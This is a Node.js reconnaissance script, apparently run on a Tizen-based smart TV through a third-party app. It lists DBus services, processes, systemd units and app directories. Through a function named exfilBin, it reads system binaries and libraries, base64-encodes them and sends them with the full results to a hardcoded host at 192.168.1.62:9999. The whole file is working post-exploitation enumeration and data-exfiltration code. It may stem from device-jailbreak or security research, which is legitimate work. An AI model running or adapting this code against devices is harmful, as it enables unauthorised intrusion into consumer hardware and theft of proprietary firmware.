"use strict";
/* p30: DBus census + app-context-manager service analysis + FreeMyTV layout + sdbd */
var fs = require('fs');
var cp = require('child_process');
var net = require('net');
var HOST = '192.168.1.62', PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p30', results: {}, log: [] };
function L(s){ R.log.push(String(s).substring(0,500)); }
function run(cmd, timeout){
  try { return cp.execSync(cmd, {timeout:timeout||30000, maxBuffer:16*1024*1024}).toString().trim(); }
  catch(e){ var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();
    return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text){
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},120000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}
function exfilBin(p, label){
  try { var b = fs.readFileSync(p); var b64 = b.toString('base64'); postRaw(label, b64); return 'posted '+b64.length+' b64'; }
  catch(e){ return 'err '+String(e).substring(0,100); }
}

// 1. systemd service files (app-context-manager)
R.results.acm_service = run('cat /usr/lib/systemd/system/app-context-manager.service 2>&1', 10000);
R.results.acm_service_files = run("find /usr/lib/systemd -name '*app-context*' -o -name '*tvctx*' 2>/dev/null | head -10", 15000);

// 2. app-context binaries: exfil
R.results.exfil_checker = exfilBin('/usr/bin/app-context-db-checker', 'bin_app-context-db-checker');
R.results.exfil_tvctx_mgr = exfilBin('/usr/bin/tvctx-manager', 'bin_tvctx-manager');
R.results.exfil_capi_acm = exfilBin('/usr/lib/libcapi-appfw-app-context-manager.so', 'lib_capi-appfw-app-context-manager');
R.results.exfil_acm_common = exfilBin('/usr/lib/libapp-context-manager-common.so', 'lib_app-context-manager-common');
R.results.exfil_pkg_initdb = exfilBin('/usr/bin/pkg_initdb', 'bin_pkg_initdb');
R.results.exfil_amd = exfilBin('/usr/bin/amd', 'bin_amd');
R.results.acm_sizes = run('ls -la /usr/bin/app-context-db-checker /usr/bin/tvctx-manager /usr/bin/pkg_initdb /usr/bin/amd /usr/lib/libcapi-appfw-app-context-manager.so /usr/lib/libapp-context-manager-common.so /usr/lib/libapp-context.so 2>&1', 10000);

// 3. DBus: list all service names
R.results.dbus_names = run('dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>&1 | head -80', 20000);
// session bus too?
R.results.dbus_session_names = run('dbus-send --session --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>&1 | head -40', 20000);

// 4. FreeMyTV layout
R.results.fmtv_ls = run('ls -la /opt/usr/apps/FreeMyTVio/ 2>&1', 10000);
R.results.fmtv_find = run('find /opt/usr/apps/FreeMyTVio -maxdepth 3 -type f 2>/dev/null | head -30', 15000);
R.results.fmtv_appdata = run('ls -la /opt/usr/home/owner/apps_rw/FreeMyTVio/ 2>&1', 10000);

// 5. ps full (find tvctx-manager, app-context-manager, webappservice running)
R.results.ps_full = run('ps -ef 2>/dev/null | head -80', 15000);

// 6. /run contents
R.results.run_ls = run('ls -la /run/ 2>&1 | head -30', 10000);

// 7. sdbd init script
R.results.sdbd = run('cat /etc/init.d/sdbd 2>&1', 10000);

// 8. launchpad binaries: sizes + who starts them
R.results.launchpad_info = run('ls -la /usr/bin/launchpad* /usr/bin/awaiter /usr/bin/amd 2>&1', 10000);
R.results.launchpad_ps = run("ps -ef 2>/dev/null | grep -iE 'launchpad|awaiter|amd|tvctx|context' | grep -v grep", 10000);

// 9. app-context.so in package-manager parserlib
R.results.exfil_libappctx = exfilBin('/etc/package-manager/parserlib/libapp-context.so', 'lib_pkgmgr_app-context');
R.results.pkgmgr_parserlib = run('ls -la /etc/package-manager/parserlib/ 2>&1 | head -20', 10000);

R.results.final = 'done ' + new Date().toISOString();
postRaw('/p30info', JSON.stringify(R));
L('p30 done');
